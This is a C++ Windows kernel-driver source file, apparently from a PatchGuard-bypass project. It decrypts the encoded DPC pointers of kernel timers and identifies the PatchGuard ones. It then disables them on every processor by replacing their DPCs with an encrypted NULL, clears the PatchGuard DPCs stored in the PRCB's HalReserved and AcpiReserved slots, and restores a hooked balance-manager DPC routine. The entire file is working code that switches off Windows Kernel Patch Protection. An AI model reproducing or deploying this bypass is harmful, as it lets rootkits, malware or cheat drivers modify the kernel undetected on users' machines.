/*
 * @file Timer.cpp
 * @brief Implementation of Timer.hpp
 */

#include "Timer.hpp"
#include "../Global.hpp"
#include "../Log.hpp"
#include "../Util/Memory.hpp"

UINT64 GetEncryptedDpc(PKDPC pDpc, PKTIMER pTimer) {
	return _rotr64(_byteswap_uint64((UINT64)pDpc ^ *gl::RtVar::KiWaitAlwaysPtr) ^ \
		(UINT64)pTimer, (UCHAR)*gl::RtVar::KiWaitNeverPtr) ^ *gl::RtVar::KiWaitNeverPtr;
}

BOOLEAN wsbp::Timer::IsPatchGuardTimer(PKTIMER pTimer) {

	PKDPC kdpcContent = GetDecryptedDpc(pTimer);
	if (kdpcContent == NULL) return FALSE;

	if (IsCanonicalAddress(kdpcContent->DeferredContext) == FALSE) {
		LogInfo("IsPatchGuardTimer: Timer %p is detected by canonical address check", pTimer);
		return TRUE; // PatchGuard timer's DpcContext is not canonical address.
	}

	// We should detect standalone detection routine - CcInitializeBcbProfiler.
	if (kdpcContent->DeferredRoutine == gl::RtVar::CcBcbProfilerPtr) {
		LogInfo("IsPatchGuardTimer: Timer %p is detected by CcBcbProfiler check", pTimer);
		return TRUE;
	}

	if (kdpcContent->DeferredRoutine == gl::RtVar::CcBcbProfiler2Ptr) {
		LogInfo("IsPatchGuardTimer: Timer %p is detected by CcBcbProfiler2 check", pTimer);
		return TRUE;
	}

	return FALSE;
}

PKDPC wsbp::Timer::GetDecryptedDpc(PKTIMER pTimer) {
	return (PKDPC)(*gl::RtVar::KiWaitAlwaysPtr ^ _byteswap_uint64(\
		(UINT64)pTimer ^ _rotl64(\
			(UINT64)pTimer->Dpc ^ *gl::RtVar::KiWaitNeverPtr, \
			(UCHAR)*gl::RtVar::KiWaitNeverPtr \
		)));
}

BOOLEAN wsbp::Timer::DisablePatchGuardTimersIdPc(KDPC* Dpc, PVOID DeferredContext, PVOID SystemArgument1, PVOID SystemArgument2) {
	UNREFERENCED_PARAMETER(Dpc);
	UNREFERENCED_PARAMETER(DeferredContext);

	
	LogVerbose("DisablePatchGuardTimersIdPc: Searching for cpu %lu", KeGetCurrentProcessorNumberEx(0));

	KTIMER_TABLE_ENTRY* timerTableEntry = \
		(KTIMER_TABLE_ENTRY*)((uintptr_t)gl::RtVar::KeGetCurrentPrcbPtr() + gl::Offsets::PrcbTimerTableOff + gl::Offsets::TimerTableEntryOff);

	for (size_t j = 0; j < gl::Constants::TimerTableEntryCount; j++) {

		PKTIMER_TABLE_ENTRY timerEntry = &timerTableEntry[j];

		if (!IsListEmpty(&timerEntry->Entry)) {

			PLIST_ENTRY currentListEntry = timerEntry->Entry.Flink;

			while (currentListEntry != &timerEntry->Entry) {

				PKTIMER currentTimer = CONTAINING_RECORD(currentListEntry, KTIMER, TimerListEntry);

				if (IsPatchGuardTimer(currentTimer)) {
					LogInfo("DisablePatchGuardTimersIdPc: Cancelled timer %p at CPU %lu", currentTimer, KeGetCurrentProcessorNumberEx(0));

					// This method is somehow not working, so we just use alternative method.
					/*
					if (!KeCancelTimer(currentTimer)) {
						LogError("GetPatchGuardTimerDpcs: Couldn't cancel timer");
						return FALSE;
					}
					*/
					

					currentTimer->Dpc = (PKDPC)GetEncryptedDpc(NULL, currentTimer); // Disable DPC by clearing Dpc pointer.

				}
				currentListEntry = currentListEntry->Flink;
			}
		}
	}

	// Now we should check PRCB->AcpiReserved and PRCB->HalReserved.
	PVOID* halReservedPtr = (PVOID*)((uintptr_t)gl::RtVar::KeGetCurrentPrcbPtr() + gl::Offsets::HalReservedOff);

	if (halReservedPtr[7] != NULL) { // HalReserved[7] is used for storing PatchGuard timer DPC.
		LogInfo("DisablePatchGuardTimersIdPc: Disabled HalReserved Dpc %p at CPU %lu", halReservedPtr[7], KeGetCurrentProcessorNumberEx(0));
		halReservedPtr[7] = NULL;
	}

	PVOID* acpiReservedPtr = (PVOID*)((uintptr_t)gl::RtVar::KeGetCurrentPrcbPtr() + gl::Offsets::AcpiReservedOff);

	if (*acpiReservedPtr != NULL) {
		LogInfo("DisablePatchGuardTimersIdPc: Disabled AcpiReserved Dpc %p at CPU %lu", *acpiReservedPtr, KeGetCurrentProcessorNumberEx(0));
		*acpiReservedPtr = NULL;
	}
	

	KeSignalCallDpcSynchronize(SystemArgument2);
	KeSignalCallDpcDone(SystemArgument1);
	return TRUE;
}


VOID wsbp::Timer::DisablePatchGuardTimers() {

	// Since we don't want to trigger race condition with our OS, call with DPC individually.
	KeGenericCallDpc((PKDEFERRED_ROUTINE)DisablePatchGuardTimersIdPc, NULL);

	LogInfo("DisablePatchGuardTimers: Done");

	return;
}

BOOLEAN wsbp::Timer::DisableAllTimers() {

	DisablePatchGuardTimers();
	RestorePgTimerHook();

	LogInfo("DisableAllTimers: Successfully downed all timers.");

	return TRUE;
}

VOID wsbp::Timer::RestorePgTimerHook() {

	using namespace gl::RtVar;
	KiBalanceSetManagerPeriodicDpcPtr->DeferredRoutine = (PKDEFERRED_ROUTINE)KiBalanceSetManagerDeferredRoutinePtr;
	// They do not modify DeferredContext, if they do, the system will be inextricable
	LogInfo("RestorePgTimerHook: Done");

	return;
}